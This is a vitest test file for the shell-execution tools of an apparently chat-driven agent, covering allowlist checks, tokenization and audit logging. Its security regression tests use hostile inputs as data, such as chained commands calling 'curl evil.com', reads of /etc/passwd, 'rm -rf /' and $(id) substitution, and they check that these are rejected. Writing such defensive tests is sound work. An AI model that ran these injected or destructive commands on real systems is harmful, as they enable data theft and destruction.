import { describe, it, expect, vi, beforeEach } from "vitest";
import Database from "better-sqlite3";
import { ensureSchema } from "../../../../memory/schema.js";
import type { ExecConfig } from "../../../../config/schema.js";
import type { ToolContext } from "../../types.js";
import { createExecRunExecutor, isCommandAllowed, tokenizeCommand } from "../run.js";
import { createExecInstallExecutor } from "../install.js";
import { createExecServiceExecutor } from "../service.js";
import { createExecStatusExecutor } from "../status.js";

// Mock the runner to avoid real command execution
vi.mock("../runner.js", () => ({
  runCommand: vi.fn(),
}));

import { runCommand } from "../runner.js";

const mockRunCommand = vi.mocked(runCommand);

function createTestDb(): Database.Database {
  const db = new Database(":memory:");
  ensureSchema(db);
  return db;
}

function makeExecConfig(overrides?: Partial<ExecConfig>): ExecConfig {
  return {
    mode: "yolo",
    scope: "admin-only",
    allowlist: [],
    command_allowlist: [],
    limits: { timeout: 120, max_output: 50000 },
    audit: { log_commands: true },
    ...overrides,
  };
}

function makeContext(overrides?: Partial<ToolContext>): ToolContext {
  return {
    bridge: {} as any,
    db: new Database(":memory:"),
    chatId: "123",
    senderId: 42,
    isGroup: false,
    ...overrides,
  };
}

describe("exec_run", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = createTestDb();
    vi.clearAllMocks();
  });

  it("calls runner with correct command and returns result", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "hello\n",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 50,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecRunExecutor(db, makeExecConfig());
    const result = await executor({ command: "echo hello" }, makeContext());

    expect(result.success).toBe(true);
    expect(result.data).toMatchObject({
      stdout: "hello\n",
      exitCode: 0,
      timedOut: false,
    });
    expect(mockRunCommand).toHaveBeenCalledWith("echo hello", {
      timeout: 120000,
      maxOutput: 50000,
      useShell: true,
    });
  });

  it("returns error when command fails", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "not found\n",
      exitCode: 127,
      signal: null,
      duration: 10,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecRunExecutor(db, makeExecConfig());
    const result = await executor({ command: "nonexistent" }, makeContext());

    expect(result.success).toBe(false);
    expect(result.error).toContain("127");
  });

  it("logs audit entry before and after execution", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "ok",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 100,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecRunExecutor(db, makeExecConfig());
    await executor({ command: "ls" }, makeContext());

    const rows = db.prepare("SELECT * FROM exec_audit").all() as any[];
    expect(rows).toHaveLength(1);
    expect(rows[0].tool).toBe("exec_run");
    expect(rows[0].command).toBe("ls");
    expect(rows[0].status).toBe("success");
    expect(rows[0].exit_code).toBe(0);
    expect(rows[0].duration_ms).toBe(100);
  });

  it("skips audit when log_commands is false", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 10,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecRunExecutor(db, makeExecConfig({ audit: { log_commands: false } }));
    await executor({ command: "ls" }, makeContext());

    const rows = db.prepare("SELECT * FROM exec_audit").all();
    expect(rows).toHaveLength(0);
  });
});

describe("exec_install", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = createTestDb();
    vi.clearAllMocks();
  });

  it("constructs correct command for apt", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "installed",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 5000,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecInstallExecutor(db, makeExecConfig());
    await executor({ manager: "apt", packages: "nginx curl" }, makeContext());

    expect(mockRunCommand).toHaveBeenCalledWith("apt install -y nginx curl", expect.any(Object));
  });

  it("constructs correct command for pip", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 1000,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecInstallExecutor(db, makeExecConfig());
    await executor({ manager: "pip", packages: "flask" }, makeContext());

    expect(mockRunCommand).toHaveBeenCalledWith("pip install flask", expect.any(Object));
  });

  it("constructs correct command for npm", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 1000,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecInstallExecutor(db, makeExecConfig());
    await executor({ manager: "npm", packages: "pm2" }, makeContext());

    expect(mockRunCommand).toHaveBeenCalledWith("npm install -g pm2", expect.any(Object));
  });

  it("constructs correct command for docker", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 3000,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecInstallExecutor(db, makeExecConfig());
    await executor({ manager: "docker", packages: "nginx:latest" }, makeContext());

    expect(mockRunCommand).toHaveBeenCalledWith("docker pull nginx:latest", expect.any(Object));
  });

  it("logs audit entry", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 1000,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecInstallExecutor(db, makeExecConfig());
    await executor({ manager: "apt", packages: "nginx" }, makeContext());

    const rows = db.prepare("SELECT * FROM exec_audit").all() as any[];
    expect(rows).toHaveLength(1);
    expect(rows[0].tool).toBe("exec_install");
    expect(rows[0].command).toBe("apt install -y nginx");
  });
});

describe("exec_service", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = createTestDb();
    vi.clearAllMocks();
  });

  it("constructs systemctl command", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "active",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 100,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecServiceExecutor(db, makeExecConfig());
    await executor({ action: "status", name: "nginx" }, makeContext());

    expect(mockRunCommand).toHaveBeenCalledWith("systemctl status nginx", expect.any(Object));
  });

  it("logs audit entry", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 200,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecServiceExecutor(db, makeExecConfig());
    await executor({ action: "restart", name: "docker" }, makeContext());

    const rows = db.prepare("SELECT * FROM exec_audit").all() as any[];
    expect(rows[0].tool).toBe("exec_service");
    expect(rows[0].command).toBe("systemctl restart docker");
  });
});

describe("tokenizeCommand", () => {
  it("splits simple command into tokens", () => {
    expect(tokenizeCommand("git status")).toEqual(["git", "status"]);
  });

  it("handles single-quoted arguments", () => {
    expect(tokenizeCommand("echo 'hello world'")).toEqual(["echo", "hello world"]);
  });

  it("handles double-quoted arguments", () => {
    expect(tokenizeCommand('echo "hello world"')).toEqual(["echo", "hello world"]);
  });

  it("returns null for commands with semicolon", () => {
    expect(tokenizeCommand("git status; id")).toBeNull();
  });

  it("returns null for commands with pipe", () => {
    expect(tokenizeCommand("git status | cat")).toBeNull();
  });

  it("returns null for commands with &&", () => {
    expect(tokenizeCommand("git status && id")).toBeNull();
  });

  it("returns null for commands with command substitution $()", () => {
    expect(tokenizeCommand("echo $(id)")).toBeNull();
  });

  it("returns null for commands with backtick substitution", () => {
    expect(tokenizeCommand("echo `id`")).toBeNull();
  });

  it("returns null for commands with output redirect", () => {
    expect(tokenizeCommand("ls > /tmp/out")).toBeNull();
  });

  it("returns null for commands with input redirect", () => {
    expect(tokenizeCommand("cat < /etc/passwd")).toBeNull();
  });

  it("returns null for commands with newline", () => {
    expect(tokenizeCommand("git status\nid")).toBeNull();
  });
});

describe("isCommandAllowed", () => {
  it("allows command when first token matches allowlist entry", () => {
    expect(isCommandAllowed("git status", ["git"])).toBe(true);
  });

  it("allows command when allowlist entry contains the same program name with args", () => {
    // "git status" allowlist entry: first token is "git", matches "git diff"'s first token
    expect(isCommandAllowed("git diff HEAD~1", ["git status"])).toBe(true);
  });

  it("allows command with extra args when first token matches", () => {
    expect(isCommandAllowed("git diff HEAD~1", ["git"])).toBe(true);
  });

  it("blocks command not in allowlist", () => {
    expect(isCommandAllowed("rm -rf /", ["ls", "cat"])).toBe(false);
  });

  it("blocks empty allowlist", () => {
    expect(isCommandAllowed("ls", [])).toBe(false);
  });

  it("does not allow prefix substring without whitespace boundary", () => {
    // 'git' allowlist entry must not match 'gitconfig' (different binary)
    expect(isCommandAllowed("gitconfig --list", ["git"])).toBe(false);
  });

  it("trims whitespace before matching", () => {
    expect(isCommandAllowed("  ls  /tmp", ["ls"])).toBe(true);
  });

  // Security regression: FULL-C2
  it("SECURITY: rejects 'git status && id' when allowlist is ['git']", () => {
    expect(isCommandAllowed("git status && id", ["git"])).toBe(false);
  });

  it("SECURITY: rejects 'git status; curl evil.com' when allowlist is ['git']", () => {
    expect(isCommandAllowed("git status; curl evil.com", ["git"])).toBe(false);
  });

  it("SECURITY: rejects 'git status | cat /etc/passwd' when allowlist is ['git']", () => {
    expect(isCommandAllowed("git status | cat /etc/passwd", ["git"])).toBe(false);
  });

  it("SECURITY: rejects 'git $(id)' when allowlist is ['git']", () => {
    expect(isCommandAllowed("git $(id)", ["git"])).toBe(false);
  });
});

describe("exec_run allowlist mode", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = createTestDb();
    vi.clearAllMocks();
  });

  it("blocks commands not in allowlist without calling runner", async () => {
    const config = makeExecConfig({
      mode: "allowlist",
      command_allowlist: ["git status", "ls"],
    });
    const executor = createExecRunExecutor(db, config);
    const result = await executor({ command: "rm -rf /" }, makeContext());

    expect(result.success).toBe(false);
    expect(result.error).toContain("not permitted");
    expect(mockRunCommand).not.toHaveBeenCalled();
  });

  it("allows commands matching an allowlist entry (first token match)", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "main\n",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 30,
      truncated: false,
      timedOut: false,
    });

    const config = makeExecConfig({
      mode: "allowlist",
      command_allowlist: ["git"],
    });
    const executor = createExecRunExecutor(db, config);
    const result = await executor({ command: "git status" }, makeContext());

    expect(result.success).toBe(true);
    // In allowlist mode, runner is called with useShell: false
    expect(mockRunCommand).toHaveBeenCalledWith(
      "git status",
      expect.objectContaining({ useShell: false })
    );
  });

  it("error message lists configured prefixes", async () => {
    const config = makeExecConfig({
      mode: "allowlist",
      command_allowlist: ["git status", "npm run"],
    });
    const executor = createExecRunExecutor(db, config);
    const result = await executor({ command: "cat /etc/passwd" }, makeContext());

    expect(result.error).toContain("git status");
    expect(result.error).toContain("npm run");
  });

  it("error message says none configured when allowlist is empty", async () => {
    const config = makeExecConfig({
      mode: "allowlist",
      command_allowlist: [],
    });
    const executor = createExecRunExecutor(db, config);
    const result = await executor({ command: "ls" }, makeContext());

    expect(result.error).toContain("none configured");
  });

  it("yolo mode still runs commands without allowlist check", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 10,
      truncated: false,
      timedOut: false,
    });

    const config = makeExecConfig({ mode: "yolo", command_allowlist: [] });
    const executor = createExecRunExecutor(db, config);
    const result = await executor({ command: "any command" }, makeContext());

    expect(result.success).toBe(true);
    expect(mockRunCommand).toHaveBeenCalled();
  });
});

describe("exec_status", () => {
  let db: Database.Database;

  beforeEach(() => {
    db = createTestDb();
    vi.clearAllMocks();
  });

  it("returns structured status data", async () => {
    mockRunCommand.mockResolvedValue({
      stdout: "some output",
      stderr: "",
      exitCode: 0,
      signal: null,
      duration: 50,
      truncated: false,
      timedOut: false,
    });

    const executor = createExecStatusExecutor(db, makeExecConfig());
    const result = await executor({} as any, makeContext());

    expect(result.success).toBe(true);
    expect(result.data).toHaveProperty("disk");
    expect(result.data).toHaveProperty("memory");
    expect(result.data).toHaveProperty("uptime");
    expect(result.data).toHaveProperty("load");
    expect(result.data).toHaveProperty("os");
    expect(result.data).toHaveProperty("cpu");
  });

  it("handles partial command failures gracefully", async () => {
    let callCount = 0;
    mockRunCommand.mockImplementation(async () => {
      callCount++;
      if (callCount === 2) {
        return {
          stdout: "",
          stderr: "free: command not found",
          exitCode: 127,
          signal: null,
          duration: 10,
          truncated: false,
          timedOut: false,
        };
      }
      return {
        stdout: "some data",
        stderr: "",
        exitCode: 0,
        signal: null,
        duration: 10,
        truncated: false,
        timedOut: false,
      };
    });

    const executor = createExecStatusExecutor(db, makeExecConfig());
    const result = await executor({} as any, makeContext());

    expect(result.success).toBe(true);
    // memory should contain the failure message
    expect(result.data.memory).toContain("failed");
    // other keys should have data
    expect(result.data.disk).toBe("some data");
  });
});
